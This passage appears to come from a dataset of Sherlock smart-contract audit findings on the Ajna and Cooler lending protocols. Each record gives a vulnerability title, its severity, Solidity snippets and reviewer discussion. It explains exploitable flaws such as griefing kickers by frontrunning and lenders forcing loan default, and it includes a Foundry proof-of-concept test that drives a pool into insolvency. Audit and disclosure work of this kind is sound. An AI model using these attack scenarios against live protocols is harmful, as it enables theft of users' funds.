issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue."чWithdrawal will fail for confirmed transaction\nCode Snippet\nTool used\nManual Review
user can drawDebt that is below dust amountчmediumч```\n    function _revertOnMinDebt(\n        LoansState storage loans_,\n        uint256 poolDebt_,\n        uint256 borrowerDebt_,\n        uint256 quoteDust_\n    ) view {\n        if (borrowerDebt_ != 0) {\n            uint256 loansCount = Loans.noOfLoans(loans_);\n            if (loansCount >= 10) {\n                if (borrowerDebt_ < _minDebtAmount(poolDebt_, loansCount)) revert AmountLTMinDebt();\n            } else {\n                if (borrowerDebt_ < quoteDust_)                            revert DustAmountNotExceeded();\n            }\n        }\n    }\n```\nчAccording to the protocol, drawDebt prevents user from drawing below the `quoteDust_` amount. However, a logical error in the code can allow user to draw below dust amount.\n`_revertOnMinDebt` is used in `drawDebt` to prevent dust loans. As you can see, the protocol wants to take the average of debt in the pool and make it the minimum if there are 10 or more loans. If it is lower than 10 loans, a `quoteDust` is used as the minimum. There is an edge case, whereby there are 10 loans in the pool, and the borrowers repay the loans till there is only 1 unit owed for each loan.(Might revert due to rounding error but it is describing a situation whereby repaying till a low amount of poolDebt can enable this). A new borrower can then `drawDebt` and because `_revertOnMindebt` only goes through the average loan amount check and not the `quoteDust_` amount check, he/she is able to draw loan that is well below the `quoteDust_` amount.\n```\n    function _revertOnMinDebt(\n        LoansState storage loans_,\n        uint256 poolDebt_,\n        uint256 borrowerDebt_,\n        uint256 quoteDust_\n    ) view {\n        if (borrowerDebt_ != 0) {\n            uint256 loansCount = Loans.noOfLoans(loans_);\n            if (loansCount >= 10) {\n                if (borrowerDebt_ < _minDebtAmount(poolDebt_, loansCount)) revert AmountLTMinDebt();\n            } else {\n                if (borrowerDebt_ < quoteDust_)                            revert DustAmountNotExceeded();\n            }\n        }\n    }\n```\n\n```\n    function _minDebtAmount(\n        uint256 debt_,\n        uint256 loansCount_\n    ) pure returns (uint256 minDebtAmount_) {\n        if (loansCount_ != 0) {\n            minDebtAmount_ = Maths.wdiv(Maths.wdiv(debt_, Maths.wad(loansCount_)), 10**19);\n        }\n    }\n```\nч
CryptoKitty and CryptoFighter NFT can be paused, which block borrowing / repaying / liquidating action in the ERC721Pool when borrowers still forced to pay the compounding interestчmediumч```\nNFTTypes nftType;\n// CryptoPunks NFTs\nif (collateral_ == 0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB ) {\n nftType = NFTTypes.CRYPTOPUNKS;\n}\n// CryptoKitties and CryptoFighters NFTs\nelse if (collateral_ == 0x06012c8cf97BEaD5deAe237070F9587f8E7A266d || collateral_ ==  0x87d598064c736dd0C712D329aFCFAA0Ccc1921A1) {\n nftType = NFTTypes.CRYPTOKITTIES;\n}\n// All other NFTs that support the EIP721 standard\nelse {\n // Here 0x80ac58cd is the ERC721 interface Id\n // Neither a standard NFT nor a non-standard supported NFT(punk, kitty or fighter)\n try IERC165(collateral_).supportsInterface(0x80ac58cd) returns (bool supportsERC721Interface) {\n  if (!supportsERC721Interface) revert NFTNotSupported();\n } catch {\n  revert NFTNotSupported();\n }\n\n nftType = NFTTypes.STANDARD_ERC721;\n}\n```\nчCryptoKitty and CryptoFighter NFT can be paused, which block borrowing / repaying / liquidating action in the ERC721Pool\nIn the current implementation in the factory contract and the pool contract, special logic is in-place to handle non-standard NFT such as crypto-kitty, crypto-figher or crypto punk.\nIn the factory contract:\n```\nNFTTypes nftType;\n// CryptoPunks NFTs\nif (collateral_ == 0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB ) {\n nftType = NFTTypes.CRYPTOPUNKS;\n}\n// CryptoKitties and CryptoFighters NFTs\nelse if (collateral_ == 0x06012c8cf97BEaD5deAe237070F9587f8E7A266d || collateral_ ==  0x87d598064c736dd0C712D329aFCFAA0Ccc1921A1) {\n nftType = NFTTypes.CRYPTOKITTIES;\n}\n// All other NFTs that support the EIP721 standard\nelse {\n // Here 0x80ac58cd is the ERC721 interface Id\n // Neither a standard NFT nor a non-standard supported NFT(punk, kitty or fighter)\n try IERC165(collateral_).supportsInterface(0x80ac58cd) returns (bool supportsERC721Interface) {\n  if (!supportsERC721Interface) revert NFTNotSupported();\n } catch {\n  revert NFTNotSupported();\n }\n\n nftType = NFTTypes.STANDARD_ERC721;\n}\n```\n\nAnd in ERC721Pool When handling ERC721 token transfer:\n```\n/**\n *  @notice Helper function for transferring multiple NFT tokens from msg.sender to pool.\n *  @notice Reverts in case token id is not supported by subset pool.\n *  @param  poolTokens_ Array in pool that tracks NFT ids (could be tracking NFTs pledged by borrower or NFTs added by a lender in a specific bucket).\n *  @param  tokenIds_   Array of NFT token ids to transfer from msg.sender to pool.\n */\nfunction _transferFromSenderToPool(\n uint256[] storage poolTokens_,\n uint256[] calldata tokenIds_\n) internal {\n bool subset   = _getArgUint256(SUBSET) != 0;\n uint8 nftType = _getArgUint8(NFT_TYPE);\n\n for (uint256 i = 0; i < tokenIds_.length;) {\n  uint256 tokenId = tokenIds_[i];\n  if (subset && !tokenIdsAllowed[tokenId]) revert OnlySubset();\n  poolTokens_.push(tokenId);\n\n  if (nftType == uint8(NFTTypes.STANDARD_ERC721)){\n   _transferNFT(msg.sender, address(this), tokenId);\n  }\n  else if (nftType == uint8(NFTTypes.CRYPTOKITTIES)) {\n   ICryptoKitties(_getArgAddress(COLLATERAL_ADDRESS)).transferFrom(msg.sender ,address(this), tokenId);\n  }\n  else{\n   ICryptoPunks(_getArgAddress(COLLATERAL_ADDRESS)).buyPunk(tokenId);\n  }\n\n  unchecked { ++i; }\n }\n}\n```\n\nand\n```\nuint8 nftType = _getArgUint8(NFT_TYPE);\n\nfor (uint256 i = 0; i < amountToRemove_;) {\n uint256 tokenId = poolTokens_[--noOfNFTsInPool]; // start with transferring the last token added in bucket\n poolTokens_.pop();\n\n if (nftType == uint8(NFTTypes.STANDARD_ERC721)){\n  _transferNFT(address(this), toAddress_, tokenId);\n }\n else if (nftType == uint8(NFTTypes.CRYPTOKITTIES)) {\n  ICryptoKitties(_getArgAddress(COLLATERAL_ADDRESS)).transfer(toAddress_, tokenId);\n }\n else {\n  ICryptoPunks(_getArgAddress(COLLATERAL_ADDRESS)).transferPunk(toAddress_, tokenId);\n }\n\n tokensTransferred[i] = tokenId;\n\n unchecked { ++i; }\n}\n```\n\nnote if the NFT address is classified as either crypto kitties or crypto fighers, then the NFT type is classified as CryptoKitties, then transfer and transferFrom method is triggered.\n```\nif (nftType == uint8(NFTTypes.CRYPTOKITTIES)) {\n   ICryptoKitties(_getArgAddress(COLLATERAL_ADDRESS)).transferFrom(msg.sender ,address(this), tokenId);\n  }\n```\n\nand\n```\nelse if (nftType == uint8(NFTTypes.CRYPTOKITTIES)) {\n ICryptoKitties(_getArgAddress(COLLATERAL_ADDRESS)).transfer(toAddress_, tokenId);\n}\n```\n\nHowever, in both crypto-kitty and in crypto-figher NFT, the transfer and transferFrom method can be paused.\nIn crypto-figher NFT:\nhttps://etherscan.io/address/0x87d598064c736dd0C712D329aFCFAA0Ccc1921A1#code#L873\n```\nfunction transferFrom(\n address _from,\n address _to,\n uint256 _tokenId\n)\n public\n whenNotPaused\n{\n```\n\nIn Crypto-kitty NFT:\nhttps://etherscan.io/address/0x06012c8cf97BEaD5deAe237070F9587f8E7A266d#code#L615\n```\nfunction transferFrom(\n address _from,\n address _to,\n uint256 _tokenId\n)\n external\n whenNotPaused\n{\n```\n\nnote the WhenNotPaused modifier.ч
`moveQuoteToken()` can cause bucket to go bankrupt but it is not reflected in the accountingчhighч```\nif (removeParams.bucketCollateral == 0 && unscaledRemaining == 0 && lpsRemaining != 0) {\n emit BucketBankruptcy(params_.index, lpsRemaining);\n bucket.lps            = 0;\n bucket.bankruptcyTime = block.timestamp;\n} else {\n bucket.lps = lpsRemaining;\n}\n```\nчBoth `removeQuoteToken()` and `moveQuoteToken()` can be used to completely remove all quote tokens from a bucket. When this happens, if at the same time `bucketCollateral == 0 && lpsRemaining != 0`, then the bucket should be declared bankrupt. This update is done in `removeQuoteToken()` but not in `moveQuoteToken()`.\n`removeQuoteToken()` has the following check to update bankruptcy time when collateral and quote token remaining is 0, but lps is more than 0. `moveQuoteToken()` is however missing this check. Both this functions has the same effects on the `fromBucket` and the only difference is that `removeQuoteToken()` returns the token to `msg.sender` but `moveQuoteToken()` moves the token to another bucket.\n```\nif (removeParams.bucketCollateral == 0 && unscaledRemaining == 0 && lpsRemaining != 0) {\n emit BucketBankruptcy(params_.index, lpsRemaining);\n bucket.lps            = 0;\n bucket.bankruptcyTime = block.timestamp;\n} else {\n bucket.lps = lpsRemaining;\n}\n```\nч
The deposit / withdraw / trade transaction lack of expiration timestamp check and slippage controlчhighч```\n// **** ADD LIQUIDITY ****\nfunction _addLiquidity(\n address tokenA,\n address tokenB,\n uint amountADesired,\n uint amountBDesired,\n uint amountAMin,\n uint amountBMin\n) internal virtual returns (uint amountA, uint amountB) {\n // create the pair if it doesn't exist yet\n if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) {\n  IUniswapV2Factory(factory).createPair(tokenA, tokenB);\n }\n (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);\n if (reserveA == 0 && reserveB == 0) {\n  (amountA, amountB) = (amountADesired, amountBDesired);\n } else {\n  uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);\n  if (amountBOptimal <= amountBDesired) {\n   require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n   (amountA, amountB) = (amountADesired, amountBOptimal);\n  } else {\n   uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);\n   assert(amountAOptimal <= amountADesired);\n   require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n   (amountA, amountB) = (amountAOptimal, amountBDesired);\n  }\n }\n}\n\nfunction addLiquidity(\n address tokenA,\n address tokenB,\n uint amountADesired,\n uint amountBDesired,\n uint amountAMin,\n uint amountBMin,\n address to,\n uint deadline\n) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) {\n (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n liquidity = IUniswapV2Pair(pair).mint(to);\n}\n```\nчThe deposit / withdraw / trade transaction lack of expiration timestamp and slippage control\nLet us look into the heavily forked Uniswap V2 contract addLiquidity function implementation\n```\n// **** ADD LIQUIDITY ****\nfunction _addLiquidity(\n address tokenA,\n address tokenB,\n uint amountADesired,\n uint amountBDesired,\n uint amountAMin,\n uint amountBMin\n) internal virtual returns (uint amountA, uint amountB) {\n // create the pair if it doesn't exist yet\n if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) {\n  IUniswapV2Factory(factory).createPair(tokenA, tokenB);\n }\n (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);\n if (reserveA == 0 && reserveB == 0) {\n  (amountA, amountB) = (amountADesired, amountBDesired);\n } else {\n  uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);\n  if (amountBOptimal <= amountBDesired) {\n   require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n   (amountA, amountB) = (amountADesired, amountBOptimal);\n  } else {\n   uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);\n   assert(amountAOptimal <= amountADesired);\n   require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n   (amountA, amountB) = (amountAOptimal, amountBDesired);\n  }\n }\n}\n\nfunction addLiquidity(\n address tokenA,\n address tokenB,\n uint amountADesired,\n uint amountBDesired,\n uint amountAMin,\n uint amountBMin,\n address to,\n uint deadline\n) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) {\n (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n liquidity = IUniswapV2Pair(pair).mint(to);\n}\n```\n\nthe implementation has two point that worth noting,\nthe first point is the deadline check\n```\nmodifier ensure(uint deadline) {\n require(deadline >= block.timestamp, 'UniswapV2Router: EXPIRED');\n _;\n}\n```\n\nThe transaction can be pending in mempool for a long and the trading activity is very time senstive. Without deadline check, the trade transaction can be executed in a long time after the user submit the transaction, at that time, the trade can be done in a sub-optimal price, which harms user's position.\nThe deadline check ensure that the transaction can be executed on time and the expired transaction revert.\nthe second point is the slippage control:\n```\nrequire(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n```\n\nand\n```\nrequire(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n```\n\nthe slippage control the user can receive the least optimal amount of the token they want to trade.\nIn the current implementation, neither the deadline check nor the slippage control is in place when user deposit / withdraw / trade.ч
Adversary can grief kicker by frontrunning kickAuction call with a large amount of loanчmediumч```\n NP_t = (1 + rate_s) * MOMP_s * TP_s * \frac{TP_s}{LUP_s} *  \frac{BI_s}{BI_t}\n```\nчAverage debt size of the pool is used to calculated MOMP (Most optimistic matching price), which is used to derive NP (neutral price). Higher average debt size will result in lower MOMP and hence lower NP which will make it harder for kicker to earn a reward and more likely that the kicker is penalized. An adversary can manipulate the average debt size of the pool by frontrunning kicker's `kickAuction` call with a large amount of loan.\nNP (neutral price) is a price that will be used to decide whether to reward a kicker with a bonus or punish the kicker with a penalty. In the event the auction ends with a price higher than NP, kicker will be given a penalty and if the auction ends with a price lower than NP, kicker will be rewarded with a bonus.\nNP is derived from MOMP (Most optimistic matching price). BI refers to borrower inflator. Quoted from the whitepaper page 17, When a loan is initiated (the first debt or additional debt is drawn, or collateral is removed from the loan), the neutral price is set to the current MOMP times the ratio of the loan’s threshold price to the LUP, plus one year’s interest. As time passes, the neutral price increases at the same rate as interest. This can be expressed as the following formula for the neutral price as a function of time 𝑡, where 𝑠 is the time the loan is initiated.\n```\n NP_t = (1 + rate_s) * MOMP_s * TP_s * \frac{TP_s}{LUP_s} *  \frac{BI_s}{BI_t}\n```\n\nTherefore the lower the MOMP, the lower the NP. Lower NP will mean that kicker will be rewarded less and punished more compared to a higher NP. Quoted from the white paper, The MOMP, or “most optimistic matching price,” is the price at which a loan of average size would match with the most favorable lenders on the book. Technically, it is the highest price for which the amount of deposit above it exceeds the average loan debt of the pool. In `_kick` function, MOMP is calculated as this. Notice how total pool debt is divided by number of loans to find the average loan debt size.\n```\n        uint256 momp = _priceAt(\n            Deposits.findIndexOfSum(\n                deposits_,\n                Maths.wdiv(poolState_.debt, noOfLoans * 1e18)\n            )\n        );\n```\n\nAn adversary can frontrun `kickAuction` by taking a huge loan, causing the price for which the amount of deposit above the undercollaterized loan bucket to have a lower probability of surpassing the average loan debt. The adversary can use the deposits for the buckets above and the total pool debt to figure out how much loan is necessary to grief the kicker significantly by lowering the MOMP and NP.ч"
Auction timers following liquidity can fall through the floor price causing pool insolvencyчmediumч"```\n    function testInsolvency() public {\n        \n        // ============== Setup Scenario ==============\n        uint256 interestRateOne = 0.05 * 10**18;           // Collateral  // Quote (loaned token, short position)\n        address poolThreeAddr = erc20PoolFactory.deployPool(address(dai), address(weth), interestRateOne);\n        ERC20Pool poolThree = ERC20Pool(address(poolThreeAddr));\n        vm.label(poolThreeAddr, ""DAI / WETH Pool Three"");\n\n        // Setup scenario and send liquidity providers some tokens\n        vm.startPrank(address(daiDoner));\n        dai.transfer(address(charlie), 3200 ether);\n        vm.stopPrank();\n\n        vm.startPrank(address(wethDoner));\n        weth.transfer(address(bob), 1000 ether);\n        vm.stopPrank();\n\n        // ==============================================\n\n\n        // Note At the time (24/01/2023) of writing ETH is currently 1,625.02 DAI,\n        // so this would be a popular bucket to deposit in.\n\n        // Start Scenario\n        // The lower dowm we go the cheaper wETH becomes - At a concentrated fenwick index of 5635, 1 wETH = 1600 DAI (Approx real life price)\n        uint256 fenwick = 5635;\n\n        vm.startPrank(address(alice));\n        weth.deposit{value: 2 ether}();\n        weth.approve(address(poolThree), 2.226 ether);\n        poolThree.addQuoteToken(2 ether, fenwick); \n        vm.stopPrank();\n\n        vm.startPrank(address(bob));\n        weth.deposit{value: 9 ether}();\n        weth.approve(address(poolThree), 9 ether);\n        poolThree.addQuoteToken(9 ether, fenwick); \n        vm.stopPrank();\n\n        assertEq(weth.balanceOf(address(poolThree)), 11 ether);\n\n\n        // ======================== start testing ========================\n\n        vm.startPrank(address(bob));\n        bytes32 poolSubsetHashes = keccak256(""ERC20_NON_SUBSET_HASH"");\n        IPositionManagerOwnerActions.MintParams memory mp = IPositionManagerOwnerActions.MintParams({\n            recipient: address(bob),\n            pool: address(poolThree),\n            poolSubsetHash: poolSubsetHashes\n        });\n        positionManager.mint(mp);\n        positionManager.setApprovalForAll(address(rewardsManager), true);\n        rewardsManager.stake(1);\n        vm.stopPrank();\n\n\n        assertEq(dai.balanceOf(address(charlie)), 3200 ether);\n        vm.startPrank(address(charlie)); // Charlie runs away with the weth tokens\n        dai.approve(address(poolThree), 3200 ether);\n        poolThree.drawDebt(address(charlie), 2 ether, fenwick, 3200 ether);\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + 62 days);\n\n\n        vm.startPrank(address(bob));\n        weth.deposit{value: 0.5 ether}();\n        weth.approve(address(poolThree), 0.5 ether);\n        poolThree.kick(address(charlie)); // Kick off liquidation\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + 10 hours);\n\n        assertEq(weth.balanceOf(address(poolThree)), 9020189981190878108); // 9 ether\n\n\n        vm.startPrank(address(bob));\n        // Bob Takes a (pretend) flashloan of 1000 weth to get cheap dai tokens\n        weth.approve(address(poolThree), 1000 ether);\n        poolThree.take(address(charlie), 1000 ether , address(bob), """");\n        weth.approve(address(poolThree), 1000 ether);\n        poolThree.take(address(charlie), 1000 ether , address(bob), """");\n        weth.approve(address(poolThree), 1000 ether);\n        poolThree.take(address(charlie), 1000 ether , address(bob), """");\n        weth.approve(address(poolThree), 1000 ether);\n        poolThree.take(address(charlie), 1000 ether, address(bob), """");\n        \n        poolThree.settle(address(charlie), 100);\n        vm.stopPrank();\n\n\n        assertEq(weth.balanceOf(address(poolThree)), 9152686732755985308); // Pool balance is still 9 ether instead of 11 ether - insolvency. \n        assertEq(dai.balanceOf(address(bob)), 3200 ether); // The original amount that charlie posted as deposit\n\n\n        vm.warp(block.timestamp + 2 hours);\n        // users attempt to withdraw after shaken by a liquidation\n        vm.startPrank(address(alice));\n        poolThree.removeQuoteToken(2 ether, fenwick);\n        vm.stopPrank();\n\n        vm.startPrank(address(bob));\n        poolThree.removeQuoteToken(9 ether, fenwick);\n        vm.stopPrank();\n\n        assertEq(weth.balanceOf(address(bob)), 1007664981389220443074); // 1007 ether, originally 1009 ether\n        assertEq(weth.balanceOf(address(alice)), 1626148471550317418); // 1.6 ether, originally 2 ether\n\n    }\n```\n"ч"When a borrower cannot pay their debt in an ERC20 pool, their position is liquidated and their assets enter an auction for other users to purchase small pieces of their assets. Because of the incentive that users wish to not pay above the standard market price for a token, users will generally wait until assets on auction are as cheap as possible to purchase however, this is flawed because this guarantees a loss for all lenders participating in the protocol with each user that is liquidated.\nProof of Concept:\n```\n    function testInsolvency() public {\n        \n        // ============== Setup Scenario ==============\n        uint256 interestRateOne = 0.05 * 10**18;           // Collateral  // Quote (loaned token, short position)\n        address poolThreeAddr = erc20PoolFactory.deployPool(address(dai), address(weth), interestRateOne);\n        ERC20Pool poolThree = ERC20Pool(address(poolThreeAddr));\n        vm.label(poolThreeAddr, ""DAI / WETH Pool Three"");\n\n        // Setup scenario and send liquidity providers some tokens\n        vm.startPrank(address(daiDoner));\n        dai.transfer(address(charlie), 3200 ether);\n        vm.stopPrank();\n\n        vm.startPrank(address(wethDoner));\n        weth.transfer(address(bob), 1000 ether);\n        vm.stopPrank();\n\n        // ==============================================\n\n\n        // Note At the time (24/01/2023) of writing ETH is currently 1,625.02 DAI,\n        // so this would be a popular bucket to deposit in.\n\n        // Start Scenario\n        // The lower dowm we go the cheaper wETH becomes - At a concentrated fenwick index of 5635, 1 wETH = 1600 DAI (Approx real life price)\n        uint256 fenwick = 5635;\n\n        vm.startPrank(address(alice));\n        weth.deposit{value: 2 ether}();\n        weth.approve(address(poolThree), 2.226 ether);\n        poolThree.addQuoteToken(2 ether, fenwick); \n        vm.stopPrank();\n\n        vm.startPrank(address(bob));\n        weth.deposit{value: 9 ether}();\n        weth.approve(address(poolThree), 9 ether);\n        poolThree.addQuoteToken(9 ether, fenwick); \n        vm.stopPrank();\n\n        assertEq(weth.balanceOf(address(poolThree)), 11 ether);\n\n\n        // ======================== start testing ========================\n\n        vm.startPrank(address(bob));\n        bytes32 poolSubsetHashes = keccak256(""ERC20_NON_SUBSET_HASH"");\n        IPositionManagerOwnerActions.MintParams memory mp = IPositionManagerOwnerActions.MintParams({\n            recipient: address(bob),\n            pool: address(poolThree),\n            poolSubsetHash: poolSubsetHashes\n        });\n        positionManager.mint(mp);\n        positionManager.setApprovalForAll(address(rewardsManager), true);\n        rewardsManager.stake(1);\n        vm.stopPrank();\n\n\n        assertEq(dai.balanceOf(address(charlie)), 3200 ether);\n        vm.startPrank(address(charlie)); // Charlie runs away with the weth tokens\n        dai.approve(address(poolThree), 3200 ether);\n        poolThree.drawDebt(address(charlie), 2 ether, fenwick, 3200 ether);\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + 62 days);\n\n\n        vm.startPrank(address(bob));\n        weth.deposit{value: 0.5 ether}();\n        weth.approve(address(poolThree), 0.5 ether);\n        poolThree.kick(address(charlie)); // Kick off liquidation\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + 10 hours);\n\n        assertEq(weth.balanceOf(address(poolThree)), 9020189981190878108); // 9 ether\n\n\n        vm.startPrank(address(bob));\n        // Bob Takes a (pretend) flashloan of 1000 weth to get cheap dai tokens\n        weth.approve(address(poolThree), 1000 ether);\n        poolThree.take(address(charlie), 1000 ether , address(bob), """");\n        weth.approve(address(poolThree), 1000 ether);\n        poolThree.take(address(charlie), 1000 ether , address(bob), """");\n        weth.approve(address(poolThree), 1000 ether);\n        poolThree.take(address(charlie), 1000 ether , address(bob), """");\n        weth.approve(address(poolThree), 1000 ether);\n        poolThree.take(address(charlie), 1000 ether, address(bob), """");\n        \n        poolThree.settle(address(charlie), 100);\n        vm.stopPrank();\n\n\n        assertEq(weth.balanceOf(address(poolThree)), 9152686732755985308); // Pool balance is still 9 ether instead of 11 ether - insolvency. \n        assertEq(dai.balanceOf(address(bob)), 3200 ether); // The original amount that charlie posted as deposit\n\n\n        vm.warp(block.timestamp + 2 hours);\n        // users attempt to withdraw after shaken by a liquidation\n        vm.startPrank(address(alice));\n        poolThree.removeQuoteToken(2 ether, fenwick);\n        vm.stopPrank();\n\n        vm.startPrank(address(bob));\n        poolThree.removeQuoteToken(9 ether, fenwick);\n        vm.stopPrank();\n\n        assertEq(weth.balanceOf(address(bob)), 1007664981389220443074); // 1007 ether, originally 1009 ether\n        assertEq(weth.balanceOf(address(alice)), 1626148471550317418); // 1.6 ether, originally 2 ether\n\n    }\n```\n"ч
Incorrect MOMP calculation in neutral price calculationчmediumч```\nuint256 loansInPool = loans_.loans.length - 1 + auctions_.noOfAuctions;\nuint256 curMomp     = _priceAt(Deposits.findIndexOfSum(deposits_, Maths.wdiv(borrowerAccruedDebt_, loansInPool * 1e18)));\n```\nчWhen calculating MOMP to find the neutral price of a borrower, borrower's accrued debt is divided by the total number of loans in the pool, but it's total pool's debt that should be divided. The mistake will result in lower neutral prices and more lost bonds to kickers.\nAs per the whitepaper:\nMOMP: is the price at which the amount of deposit above it is equal to the average loan size of the pool. MOMP is short for “Most Optimistic Matching Price”, as it’s the price at which a loan of average size would match with the most favorable lenders on the book.\nI.e. MOMP is calculated on the total number of loans of a pool (so that the average loan size could be found).\nMOMP calculation is implemented correctly when kicking a debt, however it's implementation in the Loans.update function is not correct:\n```\nuint256 loansInPool = loans_.loans.length - 1 + auctions_.noOfAuctions;\nuint256 curMomp     = _priceAt(Deposits.findIndexOfSum(deposits_, Maths.wdiv(borrowerAccruedDebt_, loansInPool * 1e18)));\n```\n\nHere, only borrower's debt (borrowerAccruedDebt_) is divided, not the entire debt of the pool.ч
Lender force Loan become defaultчhighч```\n    function repay (uint256 loanID, uint256 repaid) external {\n        Loan storage loan = loans[loanID];\n// rest of code\n        debt.transferFrom(msg.sender, loan.lender, repaid);   //***<------- lender in debt token's blocklist will revert , example :debt = usdc\n        collateral.transfer(owner, decollateralized);\n    }\n```\nчin `repay()` directly transfer the debt token to Lender, but did not consider that Lender can not accept the token (in contract blacklist), resulting in `repay()` always revert, and finally the Loan can only expire, Loan be default\nThe only way for the borrower to get the collateral token back is to repay the amount owed via repay(). Currently in the repay() method transfers the debt token directly to the Lender. This has a problem: if the Lender is blacklisted by the debt token now, the debtToken.transferFrom() method will fail and the repay() method will always fail and finally the Loan will default. Example: Assume collateral token = ETH,debt token = USDC, owner = alice 1.alice call request() to loan 2000 usdc , duration = 1 mon 2.bob call clear(): loanID =1 3.bob transfer loan[1].lender = jack by Cooler.approve/transfer\nNote: jack has been in USDC's blacklist for some reason before or bob in USDC's blacklist for some reason now, it doesn't need transfer 'lender') 4.Sometime before the expiration date, alice call repay(id=1) , it will always revert, Because usdc.transfer(jack) will revert 5.after 1 mon, loan[1] default, jack call defaulted() get collateral token\n```\n    function repay (uint256 loanID, uint256 repaid) external {\n        Loan storage loan = loans[loanID];\n// rest of code\n        debt.transferFrom(msg.sender, loan.lender, repaid);   //***<------- lender in debt token's blocklist will revert , example :debt = usdc\n        collateral.transfer(owner, decollateralized);\n    }\n```\nчDiscussion\nhrishibhat\nSponsor comment:\nNiche case + lender can transfer lender role to different, non-blacklisted wallet if needed.\nIllIllI000\nThe attacker in this case is the lender, so they wouldn't transfer to another wallet\nhrishibhat\nAgree with Lead Watson as the lender themself is the attacker hereчLender forced Loan become default for get collateral token, owner lost collateral token\nCode Snippet\nTool used\nManual Review
`Cooler.roll()` wouldn't work as expected when `newCollateral = 0`.чmediumч```\n    function roll (uint256 loanID) external {\n        Loan storage loan = loans[loanID];\n        Request memory req = loan.request;\n\n        if (block.timestamp > loan.expiry) \n            revert Default();\n\n        if (!loan.rollable)\n            revert NotRollable();\n\n        uint256 newCollateral = collateralFor(loan.amount, req.loanToCollateral) - loan.collateral;\n        uint256 newDebt = interestFor(loan.amount, req.interest, req.duration);\n\n        loan.amount += newDebt;\n        loan.expiry += req.duration;\n        loan.collateral += newCollateral;\n        \n        collateral.transferFrom(msg.sender, address(this), newCollateral); //@audit 0 amount\n    }\n```\nч`Cooler.roll()` is used to increase the loan duration by transferring the additional collateral.\nBut there will be some problems when `newCollateral = 0`.\n```\n    function roll (uint256 loanID) external {\n        Loan storage loan = loans[loanID];\n        Request memory req = loan.request;\n\n        if (block.timestamp > loan.expiry) \n            revert Default();\n\n        if (!loan.rollable)\n            revert NotRollable();\n\n        uint256 newCollateral = collateralFor(loan.amount, req.loanToCollateral) - loan.collateral;\n        uint256 newDebt = interestFor(loan.amount, req.interest, req.duration);\n\n        loan.amount += newDebt;\n        loan.expiry += req.duration;\n        loan.collateral += newCollateral;\n        \n        collateral.transferFrom(msg.sender, address(this), newCollateral); //@audit 0 amount\n    }\n```\n\nIn `roll()`, it transfers the `newCollateral` amount of collateral to the contract.\nAfter the borrower repaid most of the debts, `loan.amount` might be very small and `newCollateral` for the original interest might be 0 because of the rounding issue.\nThen as we can see from this one, some tokens might revert for 0 amount and `roll()` wouldn't work as expected.чI think we should handle it differently when `newCollateral = 0`.\nAccording to impact 2, I think it would be good to revert when `newCollateral = 0`.\nDiscussion\nhrishibhat\nSponsor comment:\nGood spot. Niche case.чThere will be 2 impacts.\nWhen the borrower tries to extend the loan using `roll()`, it will revert with the weird tokens when `newCollateral = 0`.\nAfter the borrower noticed he couldn't repay anymore(so the lender will default the loan), the borrower can call `roll()` again when `newCollateral = 0`. In this case, the borrower doesn't lose anything but the lender must wait for `req.duration` again to default the loan.\nCode Snippet\nTool used\nManual Review
Loan is rollable by defaultчmediumч```\n    loans.push(\n        Loan(req, req.amount + interest, collat, expiration, true, msg.sender)\n    );\n```\nчMaking the loan rollable by default gives an unfair early advantage to the borrowers.\nWhen clearing a new loan, the flag of `rollable` is set to true by default:\n```\n    loans.push(\n        Loan(req, req.amount + interest, collat, expiration, true, msg.sender)\n    );\n```\n\nThis means a borrower can extend the loan anytime before the expiry:\n```\n    function roll (uint256 loanID) external {\n        Loan storage loan = loans[loanID];\n        Request memory req = loan.request;\n\n        if (block.timestamp > loan.expiry) \n            revert Default();\n\n        if (!loan.rollable)\n            revert NotRollable();\n```\n\nIf the lenders do not intend to allow rollable loans, they should separately toggle the status to prevent that:\n```\n    function toggleRoll(uint256 loanID) external returns (bool) {\n        // rest of code\n        loan.rollable = !loan.rollable;\n        // rest of code\n    }\n```\n\nI believe it gives an unfair advantage to the borrower because they can re-roll the loan before the lender's transaction forbids this action.чI believe `rollable` should be set to false by default or at least add an extra function parameter to determine the initial value of this status.\nDiscussion\nhrishibhat\nSponsor comment:\nValid. Will default to false.\nsherlock-admin\nRetracted since https://github.com/sherlock-audit/2023-01-cooler-judging/issues/215 shows that there can be circumstances where funds lose value over the life of the loan\nYou've deleted 